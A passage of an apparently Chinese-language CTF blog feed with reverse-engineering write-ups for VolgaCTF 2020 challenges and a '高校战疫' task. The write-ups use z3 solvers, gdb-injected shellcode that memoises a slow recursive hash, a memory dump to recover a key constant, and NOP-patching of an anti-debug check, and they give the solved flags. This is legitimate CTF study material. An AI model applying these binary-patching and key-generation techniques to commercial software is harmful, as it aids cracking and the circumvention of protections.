class="number">20</span>] * number[i][<span class="number">20</span>] +</span><br><span class="line">          x[<span class="number">21</span>] * number[i][<span class="number">21</span>] +</span><br><span class="line">          x[<span class="number">22</span>] * number[i][<span class="number">22</span>] +</span><br><span class="line">          x[<span class="number">23</span>] * number[i][<span class="number">23</span>] +</span><br><span class="line">          x[<span class="number">24</span>] * number[i][<span class="number">24</span>] +</span><br><span class="line">          x[<span class="number">25</span>] * number[i][<span class="number">25</span>] +</span><br><span class="line">          x[<span class="number">26</span>] * number[i][<span class="number">26</span>] +</span><br><span class="line">          x[<span class="number">27</span>] * number[i][<span class="number">27</span>] +</span><br><span class="line">          x[<span class="number">28</span>] * number[i][<span class="number">28</span>] +</span><br><span class="line">          x[<span class="number">29</span>] * number[i][<span class="number">29</span>] +</span><br><span class="line">          x[<span class="number">30</span>] * number[i][<span class="number">30</span>] +</span><br><span class="line">          x[<span class="number">31</span>] * number[i][<span class="number">31</span>] +</span><br><span class="line">          x[<span class="number">32</span>] * number[i][<span class="number">32</span>] +</span><br><span class="line">          x[<span class="number">33</span>] * number[i][<span class="number">33</span>] +</span><br><span class="line">          x[<span class="number">34</span>] * number[i][<span class="number">34</span>] +</span><br><span class="line">          x[<span class="number">35</span>] * number[i][<span class="number">35</span>] +</span><br><span class="line">          x[<span class="number">36</span>] * number[i][<span class="number">36</span>] +</span><br><span class="line">          x[<span class="number">37</span>] * number[i][<span class="number">37</span>] +</span><br><span class="line">          x[<span class="number">38</span>] * number[i][<span class="number">38</span>] +</span><br><span class="line">          x[<span class="number">39</span>] * number[i][<span class="number">39</span>] +</span><br><span class="line">          x[<span class="number">40</span>] * number[i][<span class="number">40</span>] +</span><br><span class="line">          x[<span class="number">41</span>] * number[i][<span class="number">41</span>] +</span><br><span class="line">          x[<span class="number">42</span>] * number[i][<span class="number">42</span>] +</span><br><span class="line">          x[<span class="number">43</span>] * number[i][<span class="number">43</span>] +</span><br><span class="line">          x[<span class="number">44</span>] * number[i][<span class="number">44</span>]</span><br><span class="line">          == number[i][<span class="number">45</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check():</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p>整理结果得flag:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>)]</span><br><span class="line">x[<span class="number">0</span>] = <span class="number">86</span></span><br><span class="line">x[<span class="number">26</span>] = <span class="number">99</span></span><br><span class="line">x[<span class="number">33</span>] = <span class="number">117</span></span><br><span class="line">x[<span class="number">39</span>] = <span class="number">95</span></span><br><span class="line">x[<span class="number">3</span>] = <span class="number">103</span></span><br><span class="line">x[<span class="number">29</span>] = <span class="number">51</span></span><br><span class="line">x[<span class="number">21</span>] = <span class="number">104</span></span><br><span class="line">x[<span class="number">2</span>] = <span class="number">108</span></span><br><span class="line">x[<span class="number">1</span>] = <span class="number">111</span></span><br><span class="line">x[<span class="number">36</span>] = <span class="number">86</span></span><br><span class="line">x[<span class="number">44</span>] = <span class="number">125</span></span><br><span class="line">x[<span class="number">5</span>] = <span class="number">67</span></span><br><span class="line">x[<span class="number">4</span>] = <span class="number">97</span></span><br><span class="line">x[<span class="number">20</span>] = <span class="number">55</span></span><br><span class="line">x[<span class="number">23</span>] = <span class="number">99</span></span><br><span class="line">x[<span class="number">32</span>] = <span class="number">48</span></span><br><span class="line">x[<span class="number">8</span>] = <span class="number">123</span></span><br><span class="line">x[<span class="number">7</span>] = <span class="number">70</span></span><br><span class="line">x[<span class="number">16</span>] = <span class="number">55</span></span><br><span class="line">x[<span class="number">18</span>] = <span class="number">77</span></span><br><span class="line">x[<span class="number">11</span>] = <span class="number">51</span></span><br><span class="line">x[<span class="number">22</span>] = <span class="number">95</span></span><br><span class="line">x[<span class="number">27</span>] = <span class="number">107</span></span><br><span class="line">x[<span class="number">28</span>] = <span class="number">77</span></span><br><span class="line">x[<span class="number">10</span>] = <span class="number">104</span></span><br><span class="line">x[<span class="number">37</span>] = <span class="number">51</span></span><br><span class="line">x[<span class="number">35</span>] = <span class="number">51</span></span><br><span class="line">x[<span class="number">12</span>] = <span class="number">95</span></span><br><span class="line">x[<span class="number">14</span>] = <span class="number">48</span></span><br><span class="line">x[<span class="number">42</span>] = <span class="number">51</span></span><br><span class="line">x[<span class="number">24</span>] = <span class="number">114</span></span><br><span class="line">x[<span class="number">25</span>] = <span class="number">52</span></span><br><span class="line">x[<span class="number">40</span>] = <span class="number">53</span></span><br><span class="line">x[<span class="number">17</span>] = <span class="number">95</span></span><br><span class="line">x[<span class="number">30</span>] = <span class="number">95</span></span><br><span class="line">x[<span class="number">13</span>] = <span class="number">77</span></span><br><span class="line">x[<span class="number">43</span>] = <span class="number">78</span></span><br><span class="line">x[<span class="number">9</span>] = <span class="number">55</span></span><br><span class="line">x[<span class="number">34</span>] = <span class="number">95</span></span><br><span class="line">x[<span class="number">6</span>] = <span class="number">84</span></span><br><span class="line">x[<span class="number">15</span>] = <span class="number">53</span></span><br><span class="line">x[<span class="number">19</span>] = <span class="number">52</span></span><br><span class="line">x[<span class="number">31</span>] = <span class="number">121</span></span><br><span class="line">x[<span class="number">41</span>] = <span class="number">51</span></span><br><span class="line">x[<span class="number">38</span>] = <span class="number">82</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,x)))</span><br></pre></td></tr></table></figure><p>flag:<code>VolgaCTF&#123;7h3_M057_M47h_cr4ckM3_y0u_3V3R_533N&#125;</code></p><h2 id="f-hash"><a href="#f-hash" class="headerlink" title="f-hash"></a>f-hash</h2><p>参考<a href="https://red0xff.github.io/writeups/volgactf_fhash/">wp</a></p><h3 id="初始分析"><a href="#初始分析" class="headerlink" title="初始分析"></a>初始分析</h3><p>先运行一下,发现死循环,且也没有任何回显</p><p>IDA打开,动态调试,跟踪到对函数第一次调用</p><p><img src="http://yanxuan.nosdn.127.net/96ff661fa4e664b33ff58149d91099a4.png" alt="UTOOLS1585581679190.png"></p><p>进入函数,函数对自身进行了递归调用,</p><p><img src="http://yanxuan.nosdn.127.net/2e89ae79963fe1d8b8758e58b89dd6c9.png" alt="UTOOLS1585581733264.png"></p><p>查看传入参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x7fffffffddc0 --&gt; 0x0</span><br><span class="line">arg[1]: 0x100</span><br><span class="line">arg[2]: 0x6369757120656854 (&#x27;The quic&#x27;)</span><br><span class="line">arg[3]: 0x206e776f7262206b (&#x27;k brown &#x27;)</span><br></pre></td></tr></table></figure><p>发现递归调用0x100次,递归实现浪费了反复重新计算它们的时间, 因此卡住了~</p><p>比如调用fun(6):</p><p><img src="http://yanxuan.nosdn.127.net/12588e3c8491aa6d4b73029277ad922e.png" alt="UTOOLS1585556049511.png"></p><p>首先先简化代码流程,用python伪代码表示:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">char buf[] ,<span class="built_in">int</span> i , <span class="built_in">int</span> x , <span class="built_in">int</span>  y</span>):</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        rdx:rax = other_fun(x, y)</span><br><span class="line">        buf[<span class="number">0</span>] = rax</span><br><span class="line">        buf[<span class="number">1</span>] = rdx</span><br><span class="line">        buf[<span class="number">2</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">        rdx:rax = other_fun(x, y)</span><br><span class="line">        buf[<span class="number">0</span>] = rax</span><br><span class="line">        buf[<span class="number">1</span>] = rdx</span><br><span class="line">        buf[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">int</span> a[<span class="number">3</span>]</span><br><span class="line">        <span class="built_in">int</span> b[<span class="number">3</span>]</span><br><span class="line">        f(a , i - <span class="number">1</span>, x , y)</span><br><span class="line">        f(b , i - <span class="number">2</span>, x , y)</span><br><span class="line">        rdx:rax = other_fun(x ^ b[<span class="number">3</span>] + a[<span class="number">3</span>] , y )</span><br><span class="line"></span><br><span class="line">        /* 其他代码 */</span><br><span class="line"></span><br><span class="line">        buf[<span class="number">0</span>] = rax</span><br><span class="line">        buf[<span class="number">1</span>] = rdx</span><br><span class="line">        buf[<span class="number">2</span>] = r13</span><br></pre></td></tr></table></figure><p>缺少的代码从全局数组读取数据,并根据对other_fun(暂时不知道在干什么,猜测在计算字符串中每一字符二进制中1的数目)的调用、全局数组数据以及递归调用返回的内容执行一些计算</p><p>因此考虑如何优化算法代码</p><h3 id="算法优化"><a href="#算法优化" class="headerlink" title="算法优化"></a>算法优化</h3><p>由于多次调用里面有大量重复的计算,由此可以考虑用一个数组进行记录,如果已经计算过了的可以直接从数组中取值,这个方法的好处在于:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不需要知道函数具体是怎么执行的就可以知道结果</span><br></pre></td></tr></table></figure><p>伪代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> results[i] <span class="keyword">is</span> exited:</span><br><span class="line">    copy results[i] to buffer</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    / * 计算代码 */</span><br><span class="line">    copy buff to results[i]</span><br></pre></td></tr></table></figure><p>因此我们需要至少三块空间来分别存放:<code>results[]</code>,<code>copy results[i] to buffer</code>, <code>copy buff to results[i]</code></p><h4 id="1-Code-1"><a href="#1-Code-1" class="headerlink" title="1. Code 1"></a>1. Code 1</h4><p>首先我们开辟一个空间用于存放修改代码:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="variable">$cave1</span> = mmap(0x10000, 0x400, 7, 0x32, -1, 0)</span><br></pre></td></tr></table></figure><p>$cave1处代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,0x20000 ; address of results</span><br><span class="line">push rsi</span><br><span class="line">shl rsi, 5</span><br><span class="line">add rax,rsi     ; rax = &amp;results[i]</span><br><span class="line">cmp byte ptr [rax+24],1 ; 确认第四位是不是1</span><br><span class="line">je cached</span><br><span class="line">pop rsi       ; 如果不在数组内,即第四位不为1,就执行原来的操作</span><br><span class="line">push r14</span><br><span class="line">push r13</span><br><span class="line">mov r14, rcx</span><br><span class="line">mov rax, 0x5555555553b7</span><br><span class="line">jmp rax</span><br><span class="line">cached:</span><br><span class="line">mov rsi, [rax]    ; 如果在数组内,直接赋值后返回,不需递归计算</span><br><span class="line">mov [rdi], rsi</span><br><span class="line">mov rsi, [rax+8]</span><br><span class="line">mov [rdi+8], rsi</span><br><span class="line">mov rsi, [rax+16]</span><br><span class="line">mov [rdi+16], rsi</span><br><span class="line">pop rsi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h4 id="2-Results"><a href="#2-Results" class="headerlink" title="2. Results"></a>2. Results</h4><p>开辟一个空间来记录结果, <code>results</code>是一个二维数组 ,大小为0x101 * 4, 前三位存放值,最后一位存放标识</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="variable">$results</span> = mmap(0x20000, 0x101*32, 3, 0x32, -1, 0)</span><br></pre></td></tr></table></figure><p>由于有多次调用sub_565447C9B3B0(首次调用),参数除0x100外其他是不一样的,所以需要清空results数组,清空指令如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p (void*)memset(<span class="variable">$results</span>, 0, 0x101*32)</span><br></pre></td></tr></table></figure><p>根据<code>v23 += 2</code>可知while循环大概执行5次,也修改sub_565447C9B3B0参数0x100为0x1,直接测试循环几次.</p><p>代码如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b *0x000055555555577c ; 断在<span class="keyword">while</span>循环中调用递归函数处,以便执行清零操作</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$i</span> = 0</span><br><span class="line"><span class="keyword">while</span> <span class="variable">$i</span> &lt; 4</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$results</span> = mmap(0x20000, 0x101*32, 3, 0x32, -1, 0)</span><br><span class="line">    c</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$i</span>=<span class="variable">$i</span>+1</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h4 id="3-Code-2"><a href="#3-Code-2" class="headerlink" title="3. Code 2"></a>3. Code 2</h4><p>接着开辟第三个空间</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="variable">$cave2</span> = <span class="variable">$cave1</span>+0x200</span><br></pre></td></tr></table></figure><p>代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, 0x20000</span><br><span class="line">shl rdx, 5</span><br><span class="line">add rax, rdx</span><br><span class="line">mov rdx, [rbp]</span><br><span class="line">mov [rax], rdx</span><br><span class="line">mov rdx, [rbp+8]</span><br><span class="line">mov [rax+8], rdx</span><br><span class="line">mov rdx, [rbp+16]</span><br><span class="line">mov [rax+16], rdx</span><br><span class="line">mov byte ptr [rax+24], 1</span><br><span class="line">mov rax, rbp</span><br><span class="line">add rsp, 0x50</span><br><span class="line">pop rbx</span><br><span class="line">pop rbp</span><br><span class="line">pop r12</span><br><span class="line">pop r13</span><br><span class="line">pop r14</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>最后可以用pwntools的asm对上述汇编代码进行code:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch      = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os        = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian    = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;mov rax,0x20000 ;</span></span><br><span class="line"><span class="string">push rsi;</span></span><br><span class="line"><span class="string">shl rsi, 5;</span></span><br><span class="line"><span class="string">add rax,rsi    ;</span></span><br><span class="line"><span class="string">cmp byte ptr [rax+24],1 ;</span></span><br><span class="line"><span class="string">je cached;</span></span><br><span class="line"><span class="string">pop rsi      ;</span></span><br><span class="line"><span class="string">push r14;</span></span><br><span class="line"><span class="string">push r13;</span></span><br><span class="line"><span class="string">mov r14, rcx;</span></span><br><span class="line"><span class="string">mov rax, 0x5555555553b7;</span></span><br><span class="line"><span class="string">jmp rax;</span></span><br><span class="line"><span class="string">cached:;</span></span><br><span class="line"><span class="string">mov rsi, [rax]    ;</span></span><br><span class="line"><span class="string">mov [rdi], rsi;</span></span><br><span class="line"><span class="string">mov rsi, [rax+8];</span></span><br><span class="line"><span class="string">mov [rdi+8], rsi;</span></span><br><span class="line"><span class="string">mov rsi, [rax+16];</span></span><br><span class="line"><span class="string">mov [rdi+16], rsi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">ret;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code = asm(code)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    s = <span class="string">&quot;\\x&quot;</span></span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xA</span>):</span><br><span class="line">        s += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    s += <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">    <span class="built_in">print</span>(s, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到Code1:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\x48\xc7\xc0\x00\x00\x02\x00\x56\x48\xc1\xe6\x05\x48\x01\xf0\x80\x78\x18\x01\x74\x14\x5e\x41\x56\x41\x55\x49\x89\xce\x48\xb8\xb7\x53\x55\x55\x55\x55\x00\x00\xff\xe0\x48\x8b\x30\x48\x89\x37\x48\x8b\x70\x08\x48\x89\x77\x08\x48\x8b\x70\x10\x48\x89\x77\x10\x5e\xc3</span><br></pre></td></tr></table></figure><p>同理Code2:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\x48\xc7\xc0\x00\x00\x02\x00\x48\xc1\xe2\x05\x48\x01\xd0\x48\x8b\x55\x00\x48\x89\x10\x48\x8b\x55\x08\x48\x89\x50\x08\x48\x8b\x55\x10\x48\x89\x50\x10\xc6\x40\x18\x01\x48\x89\xe8\x48\x83\xc4\x50\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\xc3</span><br></pre></td></tr></table></figure><p>接着确定patch位置:</p><p>code1可以patch在函数开头,而code2需要patch在下述代码之后<img src="http://yanxuan.nosdn.127.net/ce5307664898980bc7c7fab8d439cd68.png" alt="UTOOLS1585630028654.png"></p><p>由于程序开启了canary保护,因此可以利用:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     rdx, [rsp+78h+var_30]</span><br><span class="line">xor     rdx, fs:28h</span><br></pre></td></tr></table></figure><p>处作为patch地址,则用Peda的Patch功能,可以得:</p><h4 id="Total"><a href="#Total" class="headerlink" title="Total"></a>Total</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b *0x000055555555577c</span><br><span class="line">r</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cave1</span> = mmap(0x10000, 0x400, 7, 0x32, -1, 0)</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cave2</span> = <span class="variable">$cave1</span> + 0x200</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;cave1 at %p\ncave2 at %p\nresults at %p\n&quot;</span>, <span class="variable">$cave1</span>, <span class="variable">$cave2</span>, <span class="variable">$results</span></span><br><span class="line">patch 0x5555555553b0 <span class="string">&quot;\xb8\x00\x00\x01\x00\xff\xe0&quot;</span></span><br><span class="line">patch 0x0000555555555406 <span class="string">&quot;\xb8\x00\x02\x01\x00\xff\xe0\x90\x90&quot;</span></span><br><span class="line">patch 0x5555555553d1 <span class="string">&quot;\x48\x89\x74\x24\x48&quot;</span></span><br><span class="line">patch <span class="variable">$cave1</span> <span class="string">&quot;\x48\xc7\xc0\x00\x00\x02\x00\x56\x48\xc1\xe6\x05\x48\x01\xf0\x80\x78\x18\x01\x74\x14\x5e\x41\x56\x41\x55\x49\x89\xce\x48\xb8\xb7\x53\x55\x55\x55\x55\x00\x00\xff\xe0\x48\x8b\x30\x48\x89\x37\x48\x8b\x70\x08\x48\x89\x77\x08\x48\x8b\x70\x10\x48\x89\x77\x10\x5e\xc3&quot;</span></span><br><span class="line">patch <span class="variable">$cave2</span> <span class="string">&quot;\x48\xc7\xc0\x00\x00\x02\x00\x48\xc1\xe2\x05\x48\x01\xd0\x48\x8b\x55\x00\x48\x89\x10\x48\x8b\x55\x08\x48\x89\x50\x08\x48\x8b\x55\x10\x48\x89\x50\x10\xc6\x40\x18\x01\x48\x89\xe8\x48\x83\xc4\x50\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\xc3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$i</span> = 0</span><br><span class="line"><span class="keyword">while</span> <span class="variable">$i</span> &lt; 4</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$results</span> = mmap(0x20000, 0x101*32, 3, 0x32, -1, 0)</span><br><span class="line">    c</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$i</span>=<span class="variable">$i</span>+1</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>由于gdb默认关闭ASLR(地址随机化),因此每次调试时基址时不变的</p><h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><p><img src="http://yanxuan.nosdn.127.net/a6b27715367e519c5963aa6699f7e49c.png" alt="UTOOLS1585632244789.png"></p><p>得flag:VolgaCTF{16011432ba16efc8dcf779477985b3b9}</p><h2 id="DontNetMe"><a href="#DontNetMe" class="headerlink" title="DontNetMe"></a>DontNetMe</h2><p>参考<a href="https://github.com/archercreat/CTF-Writeups/blob/master/VolgaCTF2020/rev/DotNetMe/README.md">wp</a></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>用dnSpy进行动态调试,可知主要有三个函数进行校验</p><h3 id="第1个check"><a href="#第1个check" class="headerlink" title="第1个check"></a>第1个check</h3><p>首先获得一个输入<code>text</code></p><p>然后检查 <code>len(text) == 29</code></p><p>然后检查 <code>len(text.split(&#39;-&#39;)[i]) == 4</code></p><p>且判断每一位<code>c &gt; &#39; &#39;</code></p><p>因此可以知道key的格式为:<code>YYYY-YYYY-YYYY-YYYY-YYYY-YYYY</code></p><h3 id="第2个check"><a href="#第2个check" class="headerlink" title="第2个check"></a>第2个check</h3><p>接着进入另一个函数,对每一个字符进行取整数,逐位异或操作,最后<code>num</code> 要等于41,</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    c = flag[i]</span><br><span class="line">    num ^= c;</span><br><span class="line">num == <span class="number">41</span></span><br></pre></td></tr></table></figure><h3 id="第3个check"><a href="#第3个check" class="headerlink" title="第3个check"></a>第3个check</h3><p>接着把原字符串的每一位都进行如下操作, 然后仍是逐位异或,最后等于74</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">        c = <span class="built_in">globals</span>()[<span class="string">&#x27;b%d&#x27;</span> % i]</span><br><span class="line">        n = c * <span class="built_in">ord</span>(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        v = ((n &gt;&gt; <span class="number">6</span>) + (n &gt;&gt; <span class="number">5</span>) &amp; <span class="number">127</span>) ^ (n + <span class="built_in">ord</span>(key[i]) &amp; <span class="number">127</span>) ^ <span class="built_in">ord</span>(key[flag_len - i - <span class="number">1</span>])</span><br><span class="line">        k ^= v</span><br><span class="line"></span><br><span class="line">k == <span class="number">74</span></span><br></pre></td></tr></table></figure><h3 id="如何获得常数"><a href="#如何获得常数" class="headerlink" title="如何获得常数"></a>如何获得常数</h3><p>因为二进制文件是打包的,dnspy 不能显示局部变量,所以const没有那么容易获取</p><p>我们可以在程序运行过程中把程序内存Dump出来</p><p><img src="http://yanxuan.nosdn.127.net/ec7d0dc1d6fbc3e8022a636ce5c91bb1.png" alt="UTOOLS1585843049425.png"></p><p>输出命令<code>strings -n29 DotnetmeCLI.DMP &gt; 1.txt</code> ,用python脚本再次过滤</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.readline()</span><br><span class="line">    <span class="keyword">while</span> f:</span><br><span class="line">        f = file.readline()</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(f) == <span class="number">29</span> + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(f)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 s2.py &gt; 2.txt</span><br></pre></td></tr></table></figure><p>接着搜索我们输入的字符,比如这里我输入的<code>AYBO-9odp-Lp8n-mman-XnXn-mmXn</code>（用z3过1,2个check）</p><p><img src="http://yanxuan.nosdn.127.net/0a704980b254ebdc5aa9feaebc573053.png" alt="UTOOLS1585844565436.png"></p><p><code>3cD1Z84acsdf1caEBbfgMeAF0bObA</code>正是我们需要的常数,接着z3求解即可,find_all_posible_solutions求解所有符合要求的解</p><h3 id="求解脚本"><a href="#求解脚本" class="headerlink" title="求解脚本"></a>求解脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">key = <span class="string">&#x27;3cD1Z84acsdf1caEBbfgMeAF0bObA&#x27;</span></span><br><span class="line">alp = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">flag_len = <span class="number">29</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_all_posible_solutions</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        model = s.model()</span><br><span class="line">        block = []</span><br><span class="line">        out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">            c = <span class="built_in">globals</span>()[<span class="string">&#x27;b%i&#x27;</span> % i]</span><br><span class="line">            out += <span class="built_in">chr</span>(model[c].as_long())</span><br><span class="line">            block.append(c != model[c])</span><br><span class="line">        s.add(Or(block))</span><br><span class="line">        <span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    s = Solver()</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">        <span class="built_in">globals</span>()[<span class="string">&#x27;b%d&#x27;</span> % i] = BitVec(<span class="string">&#x27;b%d&#x27;</span> % i, <span class="number">32</span>)</span><br><span class="line">        c = <span class="built_in">globals</span>()[<span class="string">&#x27;b%d&#x27;</span> % i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">            s.add(c == <span class="built_in">ord</span>(<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s.add(Or([c == <span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> alp]))</span><br><span class="line">        k ^= c</span><br><span class="line"></span><br><span class="line">    s.add(k == <span class="number">41</span>)</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">        c = <span class="built_in">globals</span>()[<span class="string">&#x27;b%d&#x27;</span> % i]</span><br><span class="line">        n = c * <span class="built_in">ord</span>(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        v = ((n &gt;&gt; <span class="number">6</span>) + (n &gt;&gt; <span class="number">5</span>) &amp; <span class="number">127</span>) ^ (n + <span class="built_in">ord</span>(key[i]) &amp; <span class="number">127</span>) ^ <span class="built_in">ord</span>(key[flag_len - i - <span class="number">1</span>])</span><br><span class="line">        k ^= v</span><br><span class="line"></span><br><span class="line">    s.add(k == <span class="number">74</span>)</span><br><span class="line">    find_all_posible_solutions(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p>解得flag:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python3 s.py</span><br><span class="line">vsxs-wvmX-7qD3-66qn-UNro-IXur</span><br></pre></td></tr></table></figure><p>根据原wp,该程序存在多解,将<code>find_all_posible_solutions()</code>中if为while即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> Vba-re </tag>
            
            <tag> .Net-re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 高校战疫</title>
      <link href="/wp-games-2020gaoxiaozhanyi/"/>
      <url>/wp-games-2020gaoxiaozhanyi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="天津垓"><a href="#天津垓" class="headerlink" title="天津垓"></a>天津垓</h2><p>首先题目要求我们输入用户名, 解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = [<span class="number">17</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">3</span>, <span class="number">47</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">16</span>]</span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">b&quot;Rising_Hopper!&quot;</span>)</span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    plain.append(cipher[i]^key[i%<span class="number">14</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(plain))</span><br></pre></td></tr></table></figure><p>得<code>Caucasus@s_ability</code></p><p>但输入后就直接退出了, 再次查看发现如果在运行过程中发现这几个窗口就会运行错误代码, 此处直接在调用处patch为nop即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">EnumFunc</span><span class="params">(HWND a1, _DWORD 